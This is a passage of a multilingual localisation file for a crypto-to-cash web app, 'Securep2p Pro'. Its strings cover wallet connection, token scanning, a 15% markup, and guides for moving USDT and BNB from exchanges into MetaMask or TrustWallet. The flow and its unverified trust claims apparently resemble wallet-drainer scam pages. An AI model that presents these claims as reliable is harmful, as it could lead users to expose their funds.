            step6Content: "Vous DEVEZ avoir du BNB dans votre portefeuille pour payer les futures transactions (envoi, échange, etc). Si vous avez oublié, vous pouvez: Acheter BNB sur l'exchange et l'envoyer à votre portefeuille. Demander à un ami de vous envoyer une petite quantité de BNB. N'essayez jamais de déplacer/échanger des tokens BEP20 avec 0 BNB dans votre portefeuille – la transaction échouera.",
            sampleFlowTitle: "Flux d'Exemple – Binance vers MetaMask (BEP20 USDT)",
            sampleStep1: "Vendez votre autre token pour USDT.",
            sampleStep2: "Achetez $1 de BNB.",
            sampleStep3: "Retirez USDT (BEP20) vers votre adresse BSC MetaMask.",
            sampleStep4: "Retirez BNB (BEP20) vers la même adresse.",
            sampleStep5: "Attendez que les deux arrivent.",
            proTipsTitle: "Conseils Pro",
            proTip1: 'Vérifiez toujours deux fois le réseau: Pour BEP20, le réseau est "Binance Smart Chain" (pas ERC20, pas TRC20).',
            proTip2: "Testez d'abord avec un petit montant (ex. $5) pour confirmer le processus de retrait.",
            proTip3: "N'envoyez jamais de fonds vers le mauvais réseau—les actifs peuvent être perdus si vous envoyez vers des adresses de réseau non supportées.",
            proTip4: "Si vous êtes bloqué, vérifiez votre historique de retrait d'exchange et l'entrée BSCscan.com de votre portefeuille (rechercher par adresse) pour le statut en temps réel."
        }
    },
    ru: {
        translation: {
            "header.title": "Securep2p Pro",
            "header.liveRates": "Живые Курсы",
            "header.connected": "Подключено",
            "header.livePayout": "ЖИВАЯ ВЫПЛАТА",
            "header.successful": "Успешно",
            "header.trading": "Торговля",
            "header.pricing": "Ценообразование",
            "header.settlement": "Расчет",
            "trust.totalVolume": "Общий Объем",
            "trust.activeUsers": "Активные Пользователи",
            "trust.successRate": "Процент Успеха",
            "trust.avgSettlement": "Средний Расчет",
            "asset.title": "Управление Активами",
            "asset.subtitle": "Мгновенно конвертируйте ваши крипто-активы в наличные",
            "asset.connectWallet": "Подключите Кошелек",
            "asset.connectSubtitle": "Безопасное подключение к сети BSC",
            "asset.connectButton": "Подключить Кошелек",
            "asset.connecting": "Подключение...",
            "asset.tradeAssets": "Торгуйте Активами",
            "asset.tradeSubtitle": "Выберите активы для конвертации в наличные",
            "asset.scanningAssets": "Сканирование Активов",
            "asset.analyzing": "Анализ вашего кошелька на доступные токены...",
            "asset.selectAsset": "Выберите Актив для Торговли",
            "asset.chooseAsset": "Выберите актив из вашего кошелька",
            "asset.amountToTrade": "Сумма для Торговли",
            "asset.maxBalance": "Максимальный Баланс",
            "asset.amountExceeds": "Сумма превышает доступный баланс",
            "asset.liveCalculation": "Живой Расчет Цены",
            "asset.marketRate": "На основе текущих рыночных курсов",
            "asset.enterAmount": "Введите сумму для просмотра живого расчета",
            "asset.fetchingPrice": "Получение живой цены...",
            "asset.youReceive": "Вы Получите",
            "asset.usdEquivalent": "Эквивалент в USD",
            "asset.priceBreakdown": "Разбивка Цены",
            "asset.marketPrice": "Рыночная Цена",
            "asset.exchangeMarkup": "Наценка Биржи (15%)",
            "asset.totalReceive": "Всего Вы Получите",
            "asset.nextPayout": "Далее: Выберите Способ Выплаты",
            "asset.noAssets": "Активы Не Найдены",
            "asset.noAssetsDesc": "В вашем кошельке не найдено торгуемых активов",
            "asset.tip": "Совет: Убедитесь, что в вашем BSC кошельке есть токены",
            "exchange.transferGuide": "Перевод с Binance/KuCoin в MetaMask/TrustWallet",
            "exchange.howToTransfer": "Как Перевести с Биржи в Кошелек",
            "exchange.fromBinance": "С Биржи Binance",
            "exchange.fromKucoin": "С Биржи KuCoin",
            "exchange.settingUpWallet": "Настройка Вашего Кошелька",
            "exchange.metamaskSetup": "Настройка MetaMask",
            "exchange.trustwalletSetup": "Настройка TrustWallet",
            "exchange.importantTips": "Важные Советы",
            "exchange.step1": "Вход и Переход к Кошельку",
            "exchange.step1Desc": `• Войдите в свой аккаунт Binance
• Перейдите в "Кошелек" → "Фиат и Спот"
• Найдите вашу криптовалюту (BTC, ETH, USDT и т.д.)`,
            "exchange.step2": "Инициировать Вывод",
            "exchange.step2Desc": `• Нажмите "Вывести" рядом с вашей криптовалютой
• Выберите "Отправить через Крипто Сеть"
• Выберите сеть "BSC (BEP20)" для низких комиссий`,
            "exchange.step3": "Ввести Адрес Кошелька",
            "exchange.step3Desc": `• Скопируйте ваш BSC адрес MetaMask/TrustWallet
• Вставьте его в поле "Адрес Получателя"
• Дважды проверьте правильность адреса`,
            "exchange.step4": "Завершить Перевод",
            "exchange.step4Desc": `• Введите сумму для вывода
• Проверьте комиссию сети (обычно $1-3 на BSC)
• Нажмите "Вывести" и подтвердите через email/SMS`,
            "exchange.kucoin1": "Доступ к Активам",
            "exchange.kucoin1Desc": `• Войдите в аккаунт KuCoin
• Перейдите в "Активы" → "Основной Аккаунт"
• Найдите вашу криптовалюту`,
            "exchange.kucoin2": "Начать Вывод",
            "exchange.kucoin2Desc": `• Нажмите кнопку "Вывести"
• Выберите "On-chain Вывод"
• Выберите сеть "BSC" для лучших тарифов`,
            "exchange.kucoin3": "Добавить Адрес Кошелька",
            "exchange.kucoin3Desc": `• Получите BSC адрес вашего кошелька
• Вставьте в поле "Адрес Вывода"
• Добавьте адрес в белый список при необходимости`,
            "exchange.kucoin4": "Подтвердить Вывод",
            "exchange.kucoin4Desc": `• Введите сумму вывода
• Проверьте комиссии и итоговую сумму
• Подтвердите с помощью 2FA/email верификации`,
            "exchange.metamaskDesc": `• Установите расширение браузера MetaMask
• Создайте новый кошелек или импортируйте существующий
• Добавьте сеть BSC вручную:
Сеть: BSC Mainnet
RPC: https://bsc-dataseed.binance.org/
ID Цепи: 56
Символ: BNB`,
            "exchange.trustwalletDesc": `• Скачайте мобильное приложение TrustWallet
• Создайте новый кошелек или импортируйте
• Сеть BSC предварительно настроена
• Включите Smart Chain (BNB) в настройках
• Ваш BSC адрес начинается с "0x..."`,
            "exchange.tip1": "• Всегда используйте сеть BSC (BEP20) для самых низких комиссий ($1-3 против $20-50 на Ethereum)",
            "exchange.tip2": "• Дважды проверяйте адреса кошельков - крипто переводы необратимы",
            "exchange.tip3": "• Начните с малых сумм для тестирования процесса",
            "exchange.tip4": "• Держите немного BNB в кошельке для комиссий транзакций",
            "exchange.tip5": "• Переводы обычно занимают 1-5 минут в сети BSC",
            "howWorks.title": "Как Это Работает",
            "howWorks.choosePayment": "Выберите Способ Оплаты",
            "howWorks.choosePaymentDesc": "Выберите предпочитаемый способ выплаты и регион",
            "howWorks.placeOrder": "Разместите Заказ",
            "howWorks.placeOrderDesc": "Укажите сумму и подтвердите детали транзакции",
            "howWorks.processPayment": "Обработка Платежа",
            "howWorks.processPaymentDesc": "Наша система безопасно обрабатывает ваши крипто-активы",
            "howWorks.settlement": "Мгновенный Расчет",
            "howWorks.settlementDesc": "Получите средства выбранным способом оплаты за минуты",
            "howWorks.complete": "Транзакция Завершена",
            "howWorks.completeDesc": "Ваша криптовалюта успешно конвертирована в наличные",
            "howWorks.note": "Примечание: Все транзакции защищены технологией мульти-подписи",
            "howWorks.support": "Круглосуточная поддержка клиентов доступна для помощи",
            "payment.selected": "Выбрано",
            "common.loading": "Загрузка...",
            "common.error": "Ошибка",
            "common.success": "Успех",
            "common.continue": "Продолжить",
            "common.back": "Назад",
            "common.next": "Далее",
            "common.confirm": "Подтвердить",
            "common.cancel": "Отменить"
        },
        detailedGuide: {
            step1Title: "1. Конвертируйте ваш токен в USDT",
            step1Subtitle: "(Работает на всех биржах – Binance, KuCoin, OKX, Bitget, Kraken и т.д.)",
            step1Content: 'Войдите в свой аккаунт на бирже (Binance, KuCoin и т.д.). Перейдите в раздел "Trade" или "Convert". Выберите токен, который у вас есть (например, BTC, ETH). Выберите обмен/продажу на USDT (Tether). Подтвердите сделку. Теперь ваш баланс в USDT.',
            step1Binance: 'На Binance: "Convert" > выбрать токен > USDT > Convert.',
            step1Kucoin: 'На KuCoin: "Trade" > Spot > выбрать пару (например, BTC/USDT) > Продать за USDT.',
            step1Others: "На OKX/Bitget/Kraken: Используйте Spot/Convert/Trade согласно UI.",
            step2Title: "2. Подготовьтесь к выводу – покройте комиссии BEP20",
            step2Content: "Выводы BEP20 (Binance Smart Chain) требуют небольшого количества BNB в вашем кошельке для оплаты комиссий за газ. Некоторые биржи автоматически вычитают BNB из вашего вывода, но многие отправляют только USDT—вам нужно будет вручную отправить немного BNB для будущих транзакций.",
            step2Action: 'Что делать: Купите ~$1 стоимости BNB (0.002 BNB обычно достаточно для многих переводов). Как выше: Перейдите в "Trade"/"Convert", купите BNB за USDT.',
            step3Title: "3. Вывести USDT (BEP20) в Trust Wallet/MetaMask",
            step3Content: 'Перейдите в "Wallet" или "Assets" на вашей бирже. Найдите USDT, нажмите "Withdraw" или "Send".',
            step3Network: 'Выбор сети: Выберите "BEP20 (BSC)" / "Binance Smart Chain (BEP20)" как сеть для вывода.',
            step3Warning: "⚠️ Не выбирайте ERC20 или TRC20, если хотите использовать BSC/BEP20.",
            step3Address: 'Введите адрес вашего кошелька: Откройте Trust Wallet или MetaMask. Выберите "Smart Chain" (для BSC) или добавьте BSC в MetaMask, если еще не добавлено. Скопируйте ваш BEP20 адрес (он будет начинаться с 0x...). Вставьте адрес в форму вывода биржи. Введите сумму вывода (оставьте небольшую сумму для комиссий за вывод, показанных на бирже). Пройдите любые проверки 2FA/Безопасности. Подтвердите вывод.',
            step4Title: "4. Вывести BNB (для комиссий за газ)",
            step4Content: "Повторите процесс вывода с BNB: Выведите BNB на тот же адрес (ваш MetaMask/Trust Wallet). Вам нужно только небольшое количество (например, 0.002 BNB).",
            step5Title: "5. Ждите подтверждения",
            step5Content: 'Большинство выводов BEP20 обрабатываются в течение 2-10 минут. Проверьте ваш Trust Wallet/MetaMask на балансы USDT и BNB в сети "Smart Chain"/BSC.',
            step6Title: "6. (Если у вас в кошельке только USDT и нет BNB)",
            step6Content: "У вас ДОЛЖНО быть немного BNB в кошельке для оплаты будущих транзакций (отправка, обмен и т.д.). Если вы забыли, вы можете: Купить BNB на бирже и отправить в ваш кошелек. Попросить друга отправить вам небольшое количество BNB. Никогда не пытайтесь перемещать/обменивать токены BEP20 с 0 BNB в кошельке – транзакция не пройдет.",
            sampleFlowTitle: "Пример потока – Binance в MetaMask (BEP20 USDT)",
            sampleStep1: "Продайте ваш другой токен за USDT.",
            sampleStep2: "Купите BNB на $1.",
            sampleStep3: "Выведите USDT (BEP20) на ваш BSC адрес MetaMask.",
            sampleStep4: "Выведите BNB (BEP20) на тот же адрес.",
            sampleStep5: "Ждите поступления обоих.",
            proTipsTitle: "Профессиональные советы",
            proTip1: 'Всегда дважды проверяйте сеть: Для BEP20 сеть "Binance Smart Chain" (не ERC20, не TRC20).',
            proTip2: "Сначала протестируйте с небольшой суммой (например, $5), чтобы подтвердить процесс вывода.",
            proTip3: "Никогда не отправляйте средства в неправильную сеть—активы могут быть потеряны, если вы отправите на неподдерживаемые сетевые адреса.",
            proTip4: "Если вы застряли, проверьте историю вывода средств с биржи и запись BSCscan.com вашего кошелька (поиск по адресу) для получения статуса в реальном времени."
        }
    },
    de: {
        translation: {
            "header.title": "Securep2p Pro",
            "header.liveRates": "Live-Kurse",
            "header.connected": "Verbunden",
            "header.livePayout": "LIVE-AUSZAHLUNG",
            "header.successful": "Erfolgreich",
            "header.trading": "Handel",
            "header.pricing": "Preisgestaltung",
            "header.settlement": "Abrechnung",
            "trust.totalVolume": "Gesamtvolumen",
            "trust.activeUsers": "Aktive Nutzer",
            "trust.successRate": "Erfolgsrate",
            "trust.avgSettlement": "Durchschn. Abrechnung",
            "asset.title": "Asset-Management",
            "asset.subtitle": "Konvertieren Sie Ihre Krypto-Assets sofort in Bargeld",
            "asset.connectWallet": "Wallet Verbinden",
            "asset.connectSubtitle": "Sichere Verbindung zum BSC-Netzwerk",
            "asset.connectButton": "Wallet Verbinden",
            "asset.connecting": "Verbinde...",
            "asset.tradeAssets": "Handeln Sie Ihre Assets",
            "asset.tradeSubtitle": "Wählen Sie Assets zur Konvertierung in Bargeld",
            "asset.scanningAssets": "Scannen Ihrer Assets",
            "asset.analyzing": "Analysiere Ihr Wallet für verfügbare Token...",
            "asset.selectAsset": "Asset zum Handeln Auswählen",
            "asset.chooseAsset": "Wählen Sie ein Asset aus Ihrem Wallet",
            "asset.amountToTrade": "Handelsbetrag",
            "asset.maxBalance": "Max. Guthaben",
            "asset.amountExceeds": "Betrag übersteigt verfügbares Guthaben",
            "asset.liveCalculation": "Live-Preisberechnung",
            "asset.marketRate": "Basierend auf aktuellen Marktkursen",
            "asset.enterAmount": "Betrag eingeben für Live-Berechnung",
            "asset.fetchingPrice": "Live-Preis abrufen...",
            "asset.youReceive": "Sie Erhalten",
            "asset.usdEquivalent": "USD-Äquivalent",
            "asset.priceBreakdown": "Preisaufschlüsselung",
            "asset.marketPrice": "Marktpreis",
            "asset.exchangeMarkup": "Börsen-Aufschlag (15%)",
            "asset.totalReceive": "Gesamt Erhalten Sie",
            "asset.nextPayout": "Weiter: Auszahlungsmethode Wählen",
            "asset.noAssets": "Keine Assets Gefunden",
            "asset.noAssetsDesc": "Keine handelbaren Assets in Ihrem Wallet gefunden",
            "asset.tip": "Tipp: Stellen Sie sicher, dass Sie Token in Ihrem BSC-Wallet haben",
            "exchange.transferGuide": "Transfer von Binance/KuCoin zu MetaMask/TrustWallet",
            "exchange.howToTransfer": "Wie man von der Börse zum Wallet überträgt",
            "exchange.fromBinance": "Von Binance Exchange",
            "exchange.fromKucoin": "Von KuCoin Exchange",
            "exchange.settingUpWallet": "Ihr Wallet Einrichten",
            "exchange.metamaskSetup": "MetaMask Einrichtung",
            "exchange.trustwalletSetup": "TrustWallet Einrichtung",
            "exchange.importantTips": "Wichtige Tipps",
            "exchange.step1": "Anmelden und zum Wallet Navigieren",
            "exchange.step1Desc": `• Melden Sie sich bei Ihrem Binance-Konto an
• Gehen Sie zu "Wallet" → "Fiat und Spot"
• Finden Sie Ihre Krypto (BTC, ETH, USDT, etc.)`,
            "exchange.step2": "Abhebung Initiieren",
            "exchange.step2Desc": `• Klicken Sie auf "Abheben" neben Ihrer Krypto
• Wählen Sie "Über Krypto-Netzwerk Senden"
• Wählen Sie "BSC (BEP20)" Netzwerk für niedrigere Gebühren`,
            "exchange.step3": "Wallet-Adresse Eingeben",
            "exchange.step3Desc": `• Kopieren Sie Ihre MetaMask/TrustWallet BSC-Adresse
• Fügen Sie sie in das Feld "Empfängeradresse" ein
• Überprüfen Sie die Adresse doppelt`,
            "exchange.step4": "Transfer Abschließen",
            "exchange.step4Desc": `• Geben Sie den Abhebungsbetrag ein
• Überprüfen Sie die Netzwerkgebühr (normalerweise $1-3 auf BSC)
• Klicken Sie auf "Abheben" und bestätigen Sie per E-Mail/SMS`,
            "exchange.kucoin1": "Auf Assets Zugreifen",
            "exchange.kucoin1Desc": `• Melden Sie sich bei KuCoin-Konto an
• Gehen Sie zu "Assets" → "Hauptkonto"
• Finden Sie Ihre Kryptowährung`,
            "exchange.kucoin2": "Abhebung Starten",
            "exchange.kucoin2Desc": `• Klicken Sie auf "Abheben" Button
• Wählen Sie "On-chain Abhebung"
• Wählen Sie "BSC" Netzwerk für beste Raten`,
            "exchange.kucoin3": "Wallet-Adresse Hinzufügen",
            "exchange.kucoin3Desc": `• Holen Sie sich Ihre Wallet BSC-Adresse
• Fügen Sie sie in das Feld "Abhebungsadresse" ein
• Fügen Sie die Adresse zur Whitelist hinzu, falls erforderlich`,
            "exchange.kucoin4": "Abhebung Bestätigen",
            "exchange.kucoin4Desc": `• Geben Sie den Abhebungsbetrag ein
• Überprüfen Sie Gebühren und Endbetrag
• Bestätigen Sie mit 2FA/E-Mail-Verifizierung`,
            "exchange.metamaskDesc": `• Installieren Sie MetaMask Browser-Erweiterung
• Erstellen Sie neues Wallet oder importieren Sie bestehendes
• Fügen Sie BSC-Netzwerk manuell hinzu:
Netzwerk: BSC Mainnet
RPC: https://bsc-dataseed.binance.org/
Chain ID: 56
Symbol: BNB`,
            "exchange.trustwalletDesc": `• Laden Sie TrustWallet Mobile App herunter
• Erstellen Sie neues Wallet oder importieren Sie
• BSC-Netzwerk ist vorkonfiguriert
• Aktivieren Sie Smart Chain (BNB) in Einstellungen
• Ihre BSC-Adresse beginnt mit "0x..."`,
            "exchange.tip1": "• Verwenden Sie immer BSC (BEP20) Netzwerk für niedrigste Gebühren ($1-3 vs $20-50 auf Ethereum)",
            "exchange.tip2": "• Überprüfen Sie Wallet-Adressen doppelt - Krypto-Transfers sind unumkehrbar",
            "exchange.tip3": "• Beginnen Sie mit kleinen Beträgen, um den Prozess zuerst zu testen",
            "exchange.tip4": "• Behalten Sie etwas BNB in Ihrem Wallet für Transaktionsgebühren",
            "exchange.tip5": "• Transfers dauern normalerweise 1-5 Minuten im BSC-Netzwerk",
            "howWorks.title": "Wie Es Funktioniert",
            "howWorks.choosePayment": "Zahlungsmethode Wählen",
            "howWorks.choosePaymentDesc": "Wählen Sie Ihre bevorzugte Auszahlungsmethode und Region",
            "howWorks.placeOrder": "Bestellung Aufgeben",
            "howWorks.placeOrderDesc": "Betrag angeben und Transaktionsdetails bestätigen",
            "howWorks.processPayment": "Zahlung Verarbeiten",
            "howWorks.processPaymentDesc": "Unser System verarbeitet Ihre Krypto-Assets sicher",
            "howWorks.settlement": "Sofortige Abrechnung",
            "howWorks.settlementDesc": "Erhalten Sie Geld über Ihre gewählte Zahlungsmethode in Minuten",
            "howWorks.complete": "Transaktion Abgeschlossen",
            "howWorks.completeDesc": "Ihre Kryptowährung wurde erfolgreich in Bargeld umgewandelt",
            "howWorks.note": "Hinweis: Alle Transaktionen sind mit Multi-Signatur-Technologie gesichert",
            "howWorks.support": "24/7 Kundensupport verfügbar für Unterstützung",
            "payment.selected": "Ausgewählt",
            "common.loading": "Laden...",
            "common.error": "Fehler",
            "common.success": "Erfolg",
            "common.continue": "Weiter",
            "common.back": "Zurück",
            "common.next": "Weiter",
            "common.confirm": "Bestätigen",
            "common.cancel": "Abbrechen"
        },
        detailedGuide: {
            step1Title: "1. Konvertieren Sie Ihren Token zu USDT",
            step1Subtitle: "(Funktioniert auf allen Börsen – Binance, KuCoin, OKX, Bitget, Kraken, etc.)",
            step1Content: 'Melden Sie sich bei Ihrem Börsenkonto an (Binance, KuCoin, etc.). Gehen Sie zum "Trade" oder "Convert" Bereich. Wählen Sie den Token, den Sie besitzen (z.B. BTC, ETH). Wählen Sie Tausch/Verkauf zu USDT (Tether). Bestätigen Sie den Handel. Jetzt ist Ihr Guthaben in USDT.',
            step1Binance: 'Auf Binance: "Convert" > Token auswählen > USDT > Convert.',
            step1Kucoin: 'Auf KuCoin: "Trade" > Spot > Paar auswählen (z.B. BTC/USDT) > Für USDT verkaufen.',
            step1Others: "Auf OKX/Bitget/Kraken: Verwenden Sie Spot/Convert/Trade je nach UI.",
            step2Title: "2. Bereiten Sie sich auf die Abhebung vor – BEP20 Gebühren abdecken",
            step2Content: "BEP20 (Binance Smart Chain) Abhebungen erfordern eine kleine Menge BNB in Ihrer Wallet, um Gasgebühren zu bezahlen. Einige Börsen ziehen BNB automatisch von Ihrer Abhebung ab, aber viele senden nur USDT—Sie müssen manuell etwas BNB für zukünftige Transaktionen senden.",
            step2Action: 'Was zu tun ist: Kaufen Sie ~$1 im Wert von BNB (0.002 BNB reicht normalerweise für viele Überweisungen). Wie oben: Gehen Sie zu "Trade"/"Convert", kaufen Sie BNB mit USDT.',
            step3Title: "3. USDT (BEP20) zu Trust Wallet/MetaMask abheben",
            step3Content: 'Gehen Sie zu "Wallet" oder "Assets" auf Ihrer Börse. Finden Sie USDT, klicken Sie auf "Withdraw" oder "Send".',
            step3Network: 'Netzwerkauswahl: Wählen Sie "BEP20 (BSC)" / "Binance Smart Chain (BEP20)" als Abhebungsnetzwerk.',
            step3Warning: "⚠️ Wählen Sie nicht ERC20 oder TRC20, wenn Sie BSC/BEP20 verwenden möchten.",
            step3Address: 'Geben Sie Ihre Wallet-Adresse ein: Öffnen Sie Trust Wallet oder MetaMask. Wählen Sie "Smart Chain" (für BSC) oder fügen Sie BSC zu MetaMask hinzu, falls noch nicht geschehen. Kopieren Sie Ihre BEP20-Adresse (beginnt mit 0x...). Fügen Sie die Adresse in das Börsen-Abhebungsformular ein. Geben Sie den Abhebungsbetrag ein (lassen Sie einen kleinen Betrag für Abhebungsgebühren, die auf der Börse angezeigt werden). Führen Sie alle 2FA/Sicherheitsprüfungen durch. Bestätigen Sie die Abhebung.',
            step4Title: "4. BNB abheben (für Gasgebühren)",
            step4Content: "Wiederholen Sie den Abhebungsprozess mit BNB: Heben Sie BNB zur gleichen Adresse ab (Ihre MetaMask/Trust Wallet). Sie benötigen nur eine kleine Menge (z.B. 0.002 BNB).",
            step5Title: "5. Auf Bestätigung warten",
            step5Content: 'Die meisten BEP20-Abhebungen werden innerhalb von 2-10 Minuten verarbeitet. Überprüfen Sie Ihre Trust Wallet/MetaMask auf USDT- und BNB-Guthaben unter dem "Smart Chain"/BSC-Netzwerk.',
            step6Title: "6. (Wenn Sie nur USDT und kein BNB in Ihrer Wallet haben)",
            step6Content: "Sie MÜSSEN etwas BNB in Ihrer Wallet haben, um für zukünftige Transaktionen (Senden, Tauschen, etc.) zu bezahlen. Wenn Sie es vergessen haben, können Sie: BNB auf der Börse kaufen und an Ihre Wallet senden. Einen Freund bitten, Ihnen eine kleine Menge BNB zu senden. Versuchen Sie niemals, BEP20-Token mit 0 BNB in Ihrer Wallet zu bewegen/tauschen – die Transaktion wird fehlschlagen.",
            sampleFlowTitle: "Beispielablauf – Binance zu MetaMask (BEP20 USDT)",
            sampleStep1: "Verkaufen Sie Ihren anderen Token für USDT.",
            sampleStep2: "Kaufen Sie BNB im Wert von $1.",
            sampleStep3: "Heben Sie USDT (BEP20) zu Ihrer MetaMask BSC-Adresse ab.",
            sampleStep4: "Heben Sie BNB (BEP20) zur gleichen Adresse ab.",
            sampleStep5: "Warten Sie, bis beide ankommen.",
            proTipsTitle: "Profi-Tipps",
            proTip1: 'Überprüfen Sie immer doppelt das Netzwerk: Für BEP20 ist das Netzwerk "Binance Smart Chain" (nicht ERC20, nicht TRC20).',
            proTip2: "Testen Sie zuerst mit einem kleinen Betrag (z.B. $5), um den Abhebungsprozess zu bestätigen.",
            proTip3: "Senden Sie niemals Geld an das falsche Netzwerk—Vermögenswerte können verloren gehen, wenn Sie an nicht unterstützte Netzwerkadressen senden.",
            proTip4: "Wenn Sie feststecken, überprüfen Sie Ihren Exchange-Abhebungsverlauf und den BSCscan.com-Eintrag Ihrer Wallet (nach Adresse suchen) für den Echtzeitstatus."
        }
    },
    ja: {
        translation: {
            "header.title": "Securep2p Pro",
            "header.liveRates": "ライブレート",
            "header.connected": "接続済み",
            "header.livePayout": "ライブペイアウト",
            "header.successful": "成功",
            "header.trading": "取引",
            "header.pricing": "価格設定",
            "header.settlement": "決済",
            "trust.totalVolume": "総取引量",
            "trust.activeUsers": "アクティブユーザー",
            "trust.successRate": "成功率",
            "trust.avgSettlement": "平均決済",
            "asset.title": "資産管理",
            "asset.subtitle": "暗号資産を即座に現金に変換",
            "asset.connectWallet": "ウォレット接続",
            "asset.connectSubtitle": "BSCネットワークへの安全な接続",
            "asset.connectButton": "ウォレット接続",
            "asset.connecting": "接続中...",
            "asset.tradeAssets": "資産を取引",
            "asset.tradeSubtitle": "現金に変換する資産を選択",
            "asset.scanningAssets": "資産をスキャン中",
            "asset.analyzing": "利用可能なトークンのためにウォレットを分析中...",
            "asset.selectAsset": "取引する資産を選択",
            "asset.chooseAsset": "ウォレットから資産を選択",
            "asset.amountToTrade": "取引金額",
            "asset.maxBalance": "最大残高",
            "asset.amountExceeds": "金額が利用可能残高を超えています",
            "asset.liveCalculation": "ライブ価格計算",
            "asset.marketRate": "現在の市場レートに基づく",
            "asset.enterAmount": "ライブ計算を見るために金額を入力",
            "asset.fetchingPrice": "ライブ価格を取得中...",
            "asset.youReceive": "受け取り額",
            "asset.usdEquivalent": "USD相当額",
            "asset.priceBreakdown": "価格内訳",
            "asset.marketPrice": "市場価格",
            "asset.exchangeMarkup": "取引所マークアップ (15%)",
            "asset.totalReceive": "総受け取り額",
            "asset.nextPayout": "次へ：支払い方法を選択",
            "asset.noAssets": "資産が見つかりません",
            "asset.noAssetsDesc": "ウォレットに取引可能な資産が見つかりません",
            "asset.tip": "ヒント：BSCウォレットにトークンがあることを確認してください",
            "exchange.transferGuide": "Binance/KuCoinからMetaMask/TrustWalletへの転送",
            "exchange.howToTransfer": "取引所からウォレットへの転送方法",
            "exchange.fromBinance": "Binance取引所から",
            "exchange.fromKucoin": "KuCoin取引所から",
            "exchange.settingUpWallet": "ウォレットの設定",
            "exchange.metamaskSetup": "MetaMask設定",
            "exchange.trustwalletSetup": "TrustWallet設定",
            "exchange.importantTips": "重要なヒント",
            "exchange.step1": "ログインしてウォレットに移動",
            "exchange.step1Desc": `• Binanceアカウントにログイン
• 「ウォレット」→「フィアットとスポット」に移動
• 暗号通貨を見つける（BTC、ETH、USDTなど）`,
            "exchange.step2": "出金を開始",
            "exchange.step2Desc": `• 暗号通貨の横にある「出金」をクリック
• 「暗号ネットワーク経由で送信」を選択
• 低手数料のため「BSC (BEP20)」ネットワークを選択`,
            "exchange.step3": "ウォレットアドレスを入力",
            "exchange.step3Desc": `• MetaMask/TrustWalletのBSCアドレスをコピー
• 「受取人のアドレス」フィールドに貼り付け
• アドレスが正しいことを再確認`,
            "exchange.step4": "転送を完了",
            "exchange.step4Desc": `• 出金金額を入力
• ネットワーク手数料を確認（BSCで通常$1-3）
• 「出金」をクリックしてメール/SMSで確認`,
            "exchange.kucoin1": "資産にアクセス",
            "exchange.kucoin1Desc": `• KuCoinアカウントにログイン
• 「資産」→「メインアカウント」に移動
• 暗号通貨を見つける`,
            "exchange.kucoin2": "出金を開始",
            "exchange.kucoin2Desc": `• 「出金」ボタンをクリック
• 「オンチェーン出金」を選択
• 最良レートのため「BSC」ネットワークを選択`,
            "exchange.kucoin3": "ウォレットアドレスを追加",
            "exchange.kucoin3Desc": `• ウォレットのBSCアドレスを取得
• 「出金アドレス」フィールドに貼り付け
• 必要に応じてアドレスをホワイトリストに追加`,
            "exchange.kucoin4": "出金を確認",
            "exchange.kucoin4Desc": `• 出金金額を入力
• 手数料と最終金額を確認
• 2FA/メール認証で確認`,
            "exchange.metamaskDesc": `• MetaMaskブラウザ拡張機能をインストール
• 新しいウォレットを作成または既存をインポート
• BSCネットワークを手動で追加：
ネットワーク：BSCメインネット
RPC：https://bsc-dataseed.binance.org/
チェーンID：56
シンボル：BNB`,
            "exchange.trustwalletDesc": `• TrustWalletモバイルアプリをダウンロード
• 新しいウォレットを作成またはインポート
• BSCネットワークは事前設定済み
• 設定でスマートチェーン（BNB）を有効化
• BSCアドレスは「0x...」で始まる`,
            "exchange.tip1": "• 最低手数料のため常にBSC (BEP20)ネットワークを使用（イーサリアムの$20-50に対し$1-3）",
            "exchange.tip2": "• ウォレットアドレスを再確認 - 暗号転送は元に戻せません",
            "exchange.tip3": "• まず小額でプロセスをテスト",
            "exchange.tip4": "• 取引手数料のためウォレットにBNBを保持",
            "exchange.tip5": "• 転送は通常BSCネットワークで1-5分かかります",
            "howWorks.title": "仕組み",
            "howWorks.choosePayment": "支払い方法を選択",
            "howWorks.choosePaymentDesc": "希望する支払い方法と地域を選択",
            "howWorks.placeOrder": "注文を出す",
            "howWorks.placeOrderDesc": "金額を指定し、取引詳細を確認",
            "howWorks.processPayment": "支払い処理",
            "howWorks.processPaymentDesc": "当社のシステムが暗号資産を安全に処理",
            "howWorks.settlement": "即座決済",
            "howWorks.settlementDesc": "選択した支払い方法で数分以内に資金を受け取り",
            "howWorks.complete": "取引完了",
            "howWorks.completeDesc": "暗号通貨が現金に正常に変換されました",
            "howWorks.note": "注意：すべての取引はマルチシグネチャ技術で保護されています",
            "howWorks.support": "サポートのため24/7カスタマーサポートが利用可能",
            "payment.selected": "選択済み",
            "common.loading": "読み込み中...",
            "common.error": "エラー",
            "common.success": "成功",
            "common.continue": "続行",
            "common.back": "戻る",
            "common.next": "次へ",
            "common.confirm": "確認",
            "common.cancel": "キャンセル"
        },
        detailedGuide: {
            step1Title: "1. トークンをUSDTに変換する",
            step1Subtitle: "（すべての取引所で動作 – Binance、KuCoin、OKX、Bitget、Krakenなど）",
            step1Content: "取引所アカウントにログインします（Binance、KuCoinなど）。「Trade」または「Convert」セクションに移動します。保有しているトークンを選択します（例：BTC、ETH）。USDT（Tether）にスワップ/売却を選択します。取引を確認します。これで残高がUSDTになります。",
            step1Binance: "Binanceで：「Convert」> トークン選択 > USDT > Convert。",
            step1Kucoin: "KuCoinで：「Trade」> Spot > ペア選択（例：BTC/USDT）> USDTで売却。",
            step1Others: "OKX/Bitget/Krakenで：UIに従ってSpot/Convert/Tradeを使用。",
            step2Title: "2. 出金の準備 – BEP20手数料をカバー",
            step2Content: "BEP20（Binance Smart Chain）出金には、ガス手数料を支払うためにウォレットに少量のBNBが必要です。一部の取引所は出金から自動的にBNBを差し引きますが、多くはUSDTのみを送信します—将来の取引のために手動で少しのBNBを送る必要があります。",
            step2Action: "やること：約$1相当のBNBを購入します（0.002 BNBは通常多くの転送に十分です）。上記と同様：「Trade」/「Convert」に移動し、USDTでBNBを購入します。",
            step3Title: "3. USDT（BEP20）をTrust Wallet/MetaMaskに出金",
            step3Content: "取引所の「Wallet」または「Assets」に移動します。USDTを見つけて「Withdraw」または「Send」をクリックします。",
            step3Network: "ネットワーク選択：出金ネットワークとして「BEP20（BSC）」/「Binance Smart Chain（BEP20）」を選択します。",
            step3Warning: "⚠️ BSC/BEP20を使用したい場合は、ERC20やTRC20を選択しないでください。",
